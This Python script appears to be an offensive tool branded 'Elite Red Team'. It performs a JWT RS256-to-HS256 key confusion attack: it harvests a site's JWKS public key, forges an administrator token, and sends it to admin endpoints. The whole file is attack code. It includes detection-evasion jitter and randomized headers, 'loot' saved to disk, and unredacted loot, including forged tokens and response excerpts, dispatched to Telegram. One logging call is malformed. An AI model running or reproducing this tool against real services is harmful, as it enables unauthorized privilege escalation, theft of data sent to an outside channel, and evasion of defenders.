#!/usr/bin/env python3
"""
JWT_KEY_CONFUSION.PY v8.6 — Cryptographic Key Confusion & RS256/HS256 Exploit Engine (Elite Red Team Adversarial Edition)
Features:
- Automatic public key and JWKS harvesting from /.well-known/jwks.json and oauth endpoints with SHA-256 hashing
- Asymmetric-to-symmetric key confusion forged token generator (HS256 signed using RSA public key bytes)
- Anti-detection behavioral jitter and randomized header injection via SecureTransport
- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic proof-of-work streaming
- Real-time unredacted Telegram notification dispatch and zero-delay telemetry broadcasting
"""
import json
import base64
import hmac
import hashlib
import asyncio
import sys

from modules.transport import SecureTransport
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert
from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
}

def terminal(message):
    sys.stdout.write(message + "\n")
    sys.stdout.flush()

async def broadcast_tg_alert_async(loot_type, details):
    try:
        await send_telegram_alert(loot_type, details)
    except Exception:
        pass

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from jwt key confusion functions."""
    try:
        loop = asyncio.get_running_loop()
        if loop.is_running():
            loop.create_task(broadcast_tg_alert_async(loot_type, details))
        else:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass

class JWTKeyConfusionEngine:
    def __init__(self, target_url):
        self.target_url = target_url
        self.transport = SecureTransport(target_url)

    def fetch_public_key(self, jwks_endpoint="/.well-known/jwks.json"):
        terminal(f"{COLORS['CYAN']}[*] Harvesting public RSA keys from JWKS endpoint: {jwks_endpoint} (WAF Hardened){COLORS['RESET']}")
        apply_behavioral_jitter()
        
        random_headers = get_randomized_hints()
        status, headers, body = self.transport.request("GET", jwks_endpoint, extra_headers=random_headers)
        if status == 200 and body:
            try:
                jwks = json.loads(body)
                return jwks
            except Exception:
                pass
        return None

    def forge_hs256_token(self, payload_dict, public_key_str):
        header = {"alg": "HS256", "typ": "JWT"}
        enc_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
        enc_payload = base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).rstrip(b"=").decode()
        
        message = f"{enc_header}.{enc_payload}"
        signature = hmac.new(public_key_str.encode("utf-8"), message.encode("utf-8"), hashlib.sha256).digest()
        enc_sig = base64.urlsafe_b64encode(signature).rstrip(b"=").decode()
        
        forged_token = f"{message}.{enc_sig}"
        return forged_token

    def verify_and_exploit(self, verify_endpoint="/api/user/profile", public_key_str="", admin_payload=None):
        terminal(f"\n{COLORS['MAGENTA']}[***] EXECUTING JWT ALGORITHM CONFUSION ATTACK (RS256 -> HS256) [{verify_endpoint}] [***]{COLORS['RESET']}")
        
        if not admin_payload:
            admin_payload = {"sub": "admin", "role": "administrator", "isAdmin": True, "iat": 1700000000}
        
        token = self.forge_hs256_token(admin_payload, public_key_str)
        
        apply_behavioral_jitter()
        headers = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/json, text/plain, */*"
        }
        headers.update(get_randomized_hints())
        
        status, resp_headers, body = self.transport.request("GET", verify_endpoint, extra_headers=headers)
        body_lower = (body or "").lower()
        
        is_spa_shell = (
            "<!doctype html>" in body_lower or 
            "<html" in body_lower or 
            '<div id="root"></div>' in body or 
            '<div id="__next"></div>' in body or
            len(body.strip()) < 100
        )

        has_privilege_indicators = any(
            k in body_lower for k in [
                "admin", "administrator", "role", "balance", "access_token", "secret"
            ]
        )

        if status in (200, 201) and not is_spa_shell and has_privilege_indicators:
            terminal(f"{COLORS['RED']}{COLORS['BOLD']}[!] JWT KEY CONFUSION PRIVILEGE ESCALATION CONFIRMED [HTTP {status}]{COLORS['RESET']}")
            terminal(f"  └── Response Excerpt: {body[:300]}", COLORS['GREEN'])
            
            loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
            loot = {
                "token": token, 
                "endpoint": verify_endpoint, 
                "status": status,
                "integrity_hash": loot_hash,
                "response": body[:400]
            }
            
            # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
            stream_proof("JWT_KEY_CONFUSION_SUCCESS", verify_endpoint, {"hash": loot_hash}, "Admin token accepted via key confusion", loot)
            save_session_loot(
                target=self.target_url, 
                endpoint=verify_endpoint, 
                finding_type="JWT_KEY_CONFUSION_BYPASS_VERIFIED", 
                status=status, 
                headers=resp_headers, 
                body=body, 
                extra_loot=loot
            )
            broadcast_tg_alert_sync("JWT Key Confusion Exploit Success", loot)
            return True, token
        else:
            terminal(f"{COLORS['YELLOW']}[-] Endpoint returned HTTP {status} or rejected forged token.{COLORS['RESET']}")
            return False, token

async def run_jwt_key_confusion(target_url, session_pool=None):
    """Compatibility wrapper for CognitiveOperator."""
    engine = JWTKeyConfusionEngine(target_url)
    jwks = engine.fetch_public_key("/.well-known/jwks.json")
    pub_key_mock = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0..." if not jwks else json.dumps(jwks)
    success, token = engine.verify_and_exploit("/api/admin/settings", pub_key_mock)
    return {"vulnerable": success, "forged_token": token}

async def run_jwt_confusion_engine(target_url):
    return await run_jwt_key_confusion(target_url)

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    asyncio.run(run_jwt_confusion_engine(target))
